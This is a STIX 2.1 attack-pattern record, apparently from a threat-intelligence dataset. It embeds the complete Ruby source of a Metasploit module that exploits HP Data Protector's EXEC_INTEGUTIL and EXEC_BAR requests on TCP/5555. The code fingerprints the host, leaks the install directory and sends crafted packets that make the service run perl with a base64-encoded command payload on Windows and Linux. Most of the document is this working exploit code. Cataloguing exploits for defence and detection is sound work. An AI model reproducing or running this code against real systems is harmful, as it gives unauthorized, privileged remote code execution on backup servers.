{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c8c859c3-3759-4fb2-9460-7d480e82a8d3",
    "created": "2024-08-14T17:06:49.362763Z",
    "modified": "2024-08-14T17:06:49.362767Z",
    "name": "HP Data Protector EXEC_INTEGUTIL Remote Code Execution",
    "description": " This exploit abuses a vulnerability in the HP Data Protector. The vulnerability exists in the Backup client service, which listens by default on TCP/5555. The EXEC_INTEGUTIL request allows to execute arbitrary commands from a restricted directory. Since it includes a perl executable, it's possible to use an EXEC_INTEGUTIL packet to execute arbitrary code. On linux targets, the perl binary isn't on the restricted directory, but an EXEC_BAR packet can be used to access the perl binary, even in the last version of HP Data Protector for linux.  This module has been tested successfully on HP Data Protector 9 over Windows 2008 R2 64 bits and CentOS 6 64 bits. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/hp_data_protector_exec_integutil.rb",
            "external_id": "hp_data_protector_exec_integutil.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'HP Data Protector EXEC_INTEGUTIL Remote Code Execution',\n      'Description'     => %q{\n        This exploit abuses a vulnerability in the HP Data Protector. The vulnerability exists\n        in the Backup client service, which listens by default on TCP/5555. The EXEC_INTEGUTIL\n        request allows to execute arbitrary commands from a restricted directory. Since it\n        includes a perl executable, it's possible to use an EXEC_INTEGUTIL packet to execute\n        arbitrary code. On linux targets, the perl binary isn't on the restricted directory, but\n        an EXEC_BAR packet can be used to access the perl binary, even in the last version of HP\n        Data Protector for linux.  This module has been tested successfully on HP Data Protector\n        9 over Windows 2008 R2 64 bits and CentOS 6 64 bits.\n      },\n      'Author'          =>\n        [\n          'Aniway.Anyway <Aniway.Anyway[at]gmail.com>', # vulnerability discovery\n          'juan vazquez'                                # msf module\n        ],\n      'References'      =>\n        [\n          [ 'ZDI', '14-344']\n        ],\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          # The powershell embedded payload takes some time to deploy\n          'WfsDelay' => 20\n        },\n      'Targets'         =>\n        [\n          [ 'Linux 64 bits / HP Data Protector 9',\n            {\n              'Platform' => 'unix',\n              'Arch'     => ARCH_CMD,\n              'Payload' => {\n                'Compat' => {\n                  'PayloadType' => 'cmd cmd_bash',\n                  'RequiredCmd' => 'perl gawk bash-tcp openssl python generic'\n                }\n              }\n            }\n          ],\n          [ 'Windows 64 bits / HP Data Protector 9',\n            {\n              'Platform' => 'win',\n              'Arch'     => ARCH_CMD,\n              'Payload' => {\n                'Compat' => {\n                  'PayloadType' => 'cmd',\n                  'RequiredCmd' => 'powershell'\n                }\n              }\n            }\n          ]\n        ],\n      'DefaultTarget'   => 0,\n      'Privileged'      => true,\n      'DisclosureDate'  => '2014-10-02'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(5555)\n      ])\n  end\n\n  def check\n    fingerprint = get_fingerprint\n\n    if fingerprint.nil?\n      return Exploit::CheckCode::Unknown\n    end\n\n    if fingerprint =~ /Data Protector A\\.(\\d+\\.\\d+)/\n      version = $1\n      vprint_status(\"Windows / HP Data Protector version #{version} found\")\n    elsif fingerprint =~ / INET/\n      vprint_status(\"Linux / HP Data Protector found\")\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    if Rex::Version.new(version) <= Rex::Version.new('9')\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Detected # there is no patch at the time of module writing\n  end\n\n  def exploit\n    rand_exec = rand_text_alpha(8)\n    print_status(\"Leaking the HP Data Protector directory...\")\n    leak = leak_hp_directory(rand_exec)\n    dir = parse_dir(leak, rand_exec)\n\n    if dir.nil?\n      dir = default_hp_dir\n      print_error(\"HP Data Protector dir not found, using the default #{dir}\")\n    else\n      unless valid_target?(dir)\n        print_error(\"HP Data Protector directory leaked as #{dir}, #{target.name} looks incorrect, trying anyway...\")\n      end\n    end\n\n    if target.name =~ /Windows/\n      #command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {:remove_comspec => true, :encode_final_payload => true})\n      print_status(\"Executing payload...\")\n      execute_windows(payload.encoded, dir)\n    else\n      print_status(\"Executing payload...\")\n      execute_linux(payload.encoded, dir)\n    end\n  end\n\n  def build_pkt(fields)\n    data = \"\\xff\\xfe\" # BOM Unicode\n    fields.each do |v|\n      data << \"#{Rex::Text.to_unicode(v)}\\x00\\x00\"\n      data << Rex::Text.to_unicode(\" \") # Separator\n    end\n\n    data.chomp!(Rex::Text.to_unicode(\" \")) # Delete last separator\n    return [data.length].pack(\"N\") + data\n  end\n\n  def get_fingerprint\n    fingerprint = get_fingerprint_windows\n    if fingerprint.nil?\n      fingerprint = get_fingerprint_linux\n    end\n\n    fingerprint\n  end\n\n  def get_fingerprint_linux\n    connect\n\n    sock.put([2].pack(\"N\") + \"\\xff\\xfe\")\n    begin\n      res = sock.get_once(4)\n    rescue EOFError\n      disconnect\n      return nil\n    end\n\n    if res.nil?\n      disconnect\n      return nil\n    else\n      length = res.unpack(\"N\")[0]\n    end\n\n    begin\n      res = sock.get_once(length)\n    rescue EOFError\n      return nil\n    ensure\n      disconnect\n    end\n\n    if res.nil?\n      return nil\n    end\n\n    res\n  end\n\n  def get_fingerprint_windows\n    connect\n\n    sock.put(rand_text_alpha_upper(64))\n    begin\n    res = sock.get_once(4)\n    rescue ::Errno::ECONNRESET, EOFError\n      disconnect\n      return nil\n    end\n\n    if res.nil?\n      disconnect\n      return nil\n    else\n      length = res.unpack(\"N\")[0]\n    end\n\n    begin\n      res = sock.get_once(length)\n    rescue EOFError\n      return nil\n    ensure\n      disconnect\n    end\n\n    if res.nil?\n      return nil\n    end\n\n    Rex::Text.to_ascii(res).chop.chomp # Delete unicode last null\n  end\n\n  def leak_hp_directory(rand_exec)\n    connect\n    pkt = build_pkt([\n      \"2\", # Message Type\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      \"28\", # Opcode EXEC_INTEGUTIL\n      rand_exec,\n    ])\n\n    sock.put(pkt)\n    begin\n      res = sock.get_once(4)\n    rescue EOFError\n      disconnect\n      return nil\n    end\n\n    if res.nil?\n      disconnect\n      return nil\n    else\n      length = res.unpack(\"N\")[0]\n    end\n\n    begin\n    res = sock.get_once(length)\n    rescue EOFError\n      return nil\n    ensure\n      disconnect\n    end\n\n    if res.nil?\n      return nil\n    end\n\n    if res =~ /No such file or directory/ # Linux signature\n      return res\n    else # deal as windows target\n      return Rex::Text.to_ascii(res).chop.chomp # Delete unicode last null\n    end\n  end\n\n  def parse_dir(data, clue)\n    if data && data =~ /The system cannot find the file specified\\..*(.:\\\\.*)bin\\\\#{clue}/\n      dir = $1\n      print_good(\"HP Data Protector directory found on #{dir}\")\n    elsif data && data =~ /\\]\\x00 (\\/.*)lbin\\/#{clue}\\x00 \\[\\d\\] No such file or directory/\n      dir = $1\n      print_good(\"HP Data Protector directory found on #{dir}\")\n    else\n      dir = nil\n    end\n\n    dir\n  end\n\n  def valid_target?(dir)\n    if target.name =~ /Windows/ && dir =~ /^[A-Za-z]:\\\\/\n      return true\n    elsif target.name =~ /Linux/ && dir.start_with?('/')\n      return true\n    end\n\n    false\n  end\n\n  def default_hp_dir\n    if target.name =~ /Windows/\n      dir = 'C:\\\\Program Files\\\\OmniBack\\\\'\n    else # linux\n      dir = '/opt/omni/lbin/'\n    end\n\n    dir\n  end\n\n  def execute_windows(cmd, hp_dir)\n    connect\n    pkt = build_pkt([\n      \"2\", # Message Type\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      \"28\", # Opcode EXEC_INTEGUTIL\n      \"perl.exe\",\n      \"-I#{hp_dir}lib\\\\perl\",\n      \"-MMIME::Base64\",\n      \"-e\",\n      \"system(decode_base64('#{Rex::Text.encode_base64(cmd)}'))\"\n    ])\n    sock.put(pkt)\n    disconnect\n  end\n\n  def execute_linux(cmd, hp_dir)\n    connect\n    pkt = build_pkt([\n      '2', # Message Type\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      '11', # Opcode EXEC_BAR\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      \"../bin/perl\",\n      rand_text_alpha(8),\n      \"-I#{hp_dir}lib/perl\",\n      '-MMIME::Base64',\n      '-e',\n      \"system(decode_base64('#{Rex::Text.encode_base64(cmd)}'))\"\n    ])\n    sock.put(pkt)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-02",
    "x_mitre_platforms": [
        "win'"
    ]
}